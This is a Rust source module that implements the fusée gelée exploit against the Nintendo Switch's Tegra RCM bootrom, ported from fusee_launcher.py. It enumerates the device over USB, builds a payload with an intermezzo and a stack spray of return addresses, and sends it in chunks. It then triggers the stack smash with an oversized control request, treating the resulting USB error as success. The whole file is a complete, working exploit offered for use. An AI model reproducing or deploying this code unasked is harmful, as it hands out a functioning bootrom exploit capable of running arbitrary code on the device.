// rcm.rs - This module contains the low-level logic for the fusée gelée exploit.
// It handles USB communication with the Switch in RCM mode, payload construction,
// and triggering the vulnerability, directly translating the logic from fusee_launcher.py.

use std::{fmt, fs, io, thread, time::Duration};
use rusb::{Context, DeviceHandle, UsbContext};

// --- Constants from the original Python script ---
const RCM_VID: u16 = 0x0955;
const RCM_PID: u16 = 0x7321;
const NORMAL_VID: u16 = 0x057E;
const NORMAL_PID: u16 = 0x2000;

const RCM_PAYLOAD_ADDR: u32 = 0x40010000;
const PAYLOAD_START_ADDR: u32 = 0x40010E40;
const STACK_SPRAY_START: u32 = 0x40014E40;
const STACK_SPRAY_END: u32 = 0x40017000;

const INTERMEZZO_PATH: &str = "intermezzo.bin";
const RCM_MAX_LEN: usize = 0x30298;
const USB_CHUNK_SIZE: usize = 0x1000;

// Custom error type for better error handling.
#[derive(Debug, Clone, PartialEq)]
pub enum Error {
    Usb(String),
    Io(String),
    PayloadTooLarge(usize),
    MissingIntermezzo,
    DeviceNotFound,
}

impl fmt::Display for Error {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        match self {
            Error::Usb(s) => write!(f, "USB Error: {}", s),
            Error::Io(s) => write!(f, "File Error: {}", s),
            Error::PayloadTooLarge(size) => write!(f, "Payload is {} bytes too large", size),
            Error::MissingIntermezzo => write!(f, "intermezzo.bin is missing"),
            Error::DeviceNotFound => write!(f, "No TegraRCM device found"),
        }
    }
}

impl From<rusb::Error> for Error {
    fn from(e: rusb::Error) -> Self {
        Error::Usb(e.to_string())
    }
}
impl From<io::Error> for Error {
    fn from(e: io::Error) -> Self {
        Error::Io(e.to_string())
    }
}

/// Find a device and open a handle, with best-effort kernel-driver detach and interface claim.
///
/// This helper:
/// - enumerates devices,
/// - matches VID/PID,
/// - opens the device,
/// - sleeps briefly to let the OS settle (helps on macOS),
/// - tries to detach kernel driver (if active) on interface 0 (best-effort),
/// - claims interface 0.
///
/// Returns `Ok(Some(handle))` if found and opened/claimed, `Ok(None)` if not found,
/// or `Err(...)` for underlying USB/IO errors.
fn find_device(vid: u16, pid: u16) -> Result<Option<DeviceHandle<Context>>, Error> {
    let context = Context::new()?;
    for device in context.devices()?.iter() {
        let desc = device.device_descriptor()?;
        if desc.vendor_id() == vid && desc.product_id() == pid {
            // Open device
            let handle = device.open()?;

            // Small sleep to avoid timing issues on macOS right after connect.
            thread::sleep(Duration::from_millis(200));

            // Best-effort: detach kernel driver if active (unix platforms)
            // kernel_driver_active / detach_kernel_driver may return Err on some platforms,
            // so ignore non-fatal errors.
            #[cfg(unix)]
            {
                if handle.kernel_driver_active(0).unwrap_or(false) {
                    let _ = handle.detach_kernel_driver(0);
                }
            }

            // Try to claim interface 0. If claiming fails, return an error (we need it claimed).
            // Some devices may require setting configuration first, try that as well if needed.
            if let Err(e) = handle.claim_interface(0) {
                // Try setting active configuration to 1 then claim again (best-effort).
                if handle.set_active_configuration(1).is_ok() {
                    handle.claim_interface(0).map_err(|e2| Error::Usb(e2.to_string()))?;
                } else {
                    return Err(Error::Usb(format!(
                        "Failed to claim interface 0: {}",
                        e
                    )));
                }
            }

            return Ok(Some(handle));
        }
    }
    Ok(None)
}

// Finds a connected TegraRCM device.
pub fn find_rcm_device() -> Result<Option<DeviceHandle<Context>>, Error> {
    find_device(RCM_VID, RCM_PID)
}

// Finds a connected Switch in normal mode.
pub fn find_normal_device() -> Result<Option<DeviceHandle<Context>>, Error> {
    find_device(NORMAL_VID, NORMAL_PID)
}

/// The main function that orchestrates the entire exploit process.
pub fn push_payload(payload_path: &str) -> Result<(), Error> {
    // 1. Find device
    let handle = find_rcm_device()?.ok_or(Error::DeviceNotFound)?;

    // 2. Read device ID (non-blocking attempt). Use a slightly longer timeout.
    let mut device_id_buf = [0u8; 16];
    match handle.read_bulk(0x81, &mut device_id_buf, Duration::from_secs(3)) {
        Ok(n) => println!("Device ID ({} bytes): {:x?}", n, &device_id_buf[..n]),
        Err(e) => {
            // Some devices may not respond on that endpoint immediately; log debug but continue.
            eprintln!("Warning: failed to read device ID bulk (continuing): {}", e);
        }
    }

    // 3. Construct the full payload
    let full_payload = build_full_payload(payload_path)?;

    // 4. Send payload in chunks (write_bulk endpoint 0x01)
    for chunk in full_payload.chunks(USB_CHUNK_SIZE) {
        let mut written = 0;
        // loop to ensure full chunk is written even if partial writes occur
        while written < chunk.len() {
            let slice = &chunk[written..];
            let n = handle.write_bulk(0x01, slice, Duration::from_secs(3))?;
            written += n;
        }
    }

    // 5. Smash the stack (expected to produce a pipe or other USB error that indicates success)
    let smash_len = 0x7000;
    let mut smash_buf = vec![0u8; smash_len];
    // Use read_control; old code used read_control with bmRequestType 0x82 etc.
    // Keep the same call but accept that an error (Pipe) is the expected outcome.
    let result = handle.read_control(0x82, 0, 0, 0, &mut smash_buf, Duration::from_secs(3));

    match result {
        Ok(_) => Err(Error::Usb("Device responded to smash, this is unexpected.".to_string())),
        Err(rusb::Error::Pipe) => {
            println!("Stack smash successful (pipe error).");
            Ok(())
        }
        Err(e) => {
            println!("Stack smash likely successful (other USB error: {}).", e);
            Ok(())
        }
    }
}

fn build_full_payload(payload_path: &str) -> Result<Vec<u8>, Error> {
    // Load user payload
    let user_payload = fs::read(payload_path)?;

    // Load intermezzo payload from embedded assets
    let intermezzo = super::ASSETS_DIR
        .get_file(INTERMEZZO_PATH)
        .ok_or(Error::MissingIntermezzo)?
        .contents()
        .to_vec();

    // Start building the payload vector
    let mut payload = Vec::new();

    // RCM command length header
    payload.extend_from_slice(&u32::to_le_bytes(RCM_MAX_LEN as u32));

    // Pad to 680 bytes
    payload.resize(680, 0);

    // Append intermezzo
    payload.extend_from_slice(&intermezzo);

    // Pad until the start of the user payload area
    let padding_size = PAYLOAD_START_ADDR as usize - (RCM_PAYLOAD_ADDR as usize + intermezzo.len());
    if padding_size > 0 {
        payload.extend_from_slice(&vec![0; padding_size]);
    }

    // Append the first part of the user payload
    let spray_padding_size = STACK_SPRAY_START as usize - PAYLOAD_START_ADDR as usize;
    let first_len = spray_padding_size.min(user_payload.len());
    payload.extend_from_slice(&user_payload[..first_len]);

    // Stack spray
    let repeat_count = (STACK_SPRAY_END - STACK_SPRAY_START) as usize / 4;
    for _ in 0..repeat_count {
        payload.extend_from_slice(&RCM_PAYLOAD_ADDR.to_le_bytes());
    }

    // Append the rest of the user payload
    if user_payload.len() > spray_padding_size {
        payload.extend_from_slice(&user_payload[spray_padding_size..]);
    }

    // Check size before final padding
    if payload.len() > RCM_MAX_LEN {
        return Err(Error::PayloadTooLarge(payload.len() - RCM_MAX_LEN));
    }

    // Pad to a multiple of USB_CHUNK_SIZE
    let rem = payload.len() % USB_CHUNK_SIZE;
    if rem != 0 {
        let final_padding = USB_CHUNK_SIZE - rem;
        payload.extend_from_slice(&vec![0; final_padding]);
    }

    Ok(payload)
}
